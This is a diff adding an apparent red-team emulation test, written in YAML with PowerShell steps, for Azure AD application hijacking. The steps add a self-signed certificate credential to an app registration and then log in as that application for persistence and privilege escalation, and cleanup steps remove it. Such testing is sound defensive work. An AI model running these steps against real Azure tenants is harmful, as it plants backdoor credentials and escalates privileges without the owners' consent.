@@ -1,0 +1,64 @@
+api_version: "2.0"
+name: Azure AD Application Hijacking - App Registration
+description: |
+    Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.
+    This can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.
+    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
+args:
+    - name: username
+      type: string
+      default: jonh@contoso.com
+    - name: password
+      type: string
+      default: p4sswd
+    - name: application_name
+      type: string
+      default: SuperApp
+uuid: a12b5531-acab-4618-a470-0dafb294a87a
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1098: Account Manipulation'
+    subtechniques:
+        - 'T1098.001: Additional Cloud Credentials'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: |
+        AzureAD module must be installed.
+      inline: |
+        try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name AzureAD -Force
+        }}} catch {exit 1}
+      executor: powershell
+    - name: azure-ad-application-hijacking---app-registration
+      inline: |
+        Import-Module -Name AzureAD
+        $PWord = ConvertTo-SecureString -String "{{.Args.password}}" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $Pword
+        Connect-AzureAD -Credential $Credential > $null
+
+        $app = Get-AzureADApplication -SearchString "{{.Args.application_name}}" | Select-Object -First 1
+        if ($app -eq $null) { Write-Warning "Application not found"; exit }
+
+        # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
+        $credNotAfter = (Get-Date).AddDays(1)
+        $certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry
+
+        $cert = New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -FriendlyName "AtomicCert" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter
+        $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+        Write-Host "Generated certificate ""$($cert.Thumbprint)"""
+
+        New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier "AtomicTest" -Usage Verify -Value $keyValue -EndDate $credNotAfter
+
+        Start-Sleep -s 30
+        $tenant = Get-AzureADTenantDetail
+        $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
+        Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
+        Write-Host "End of Hijacking"
+      executor: powershell
+      cleanup:
+        inline: "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"{{.Args.password}}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"{{.Args.username}}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"{{.Args.application_name}}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n"
+        executor: powershell
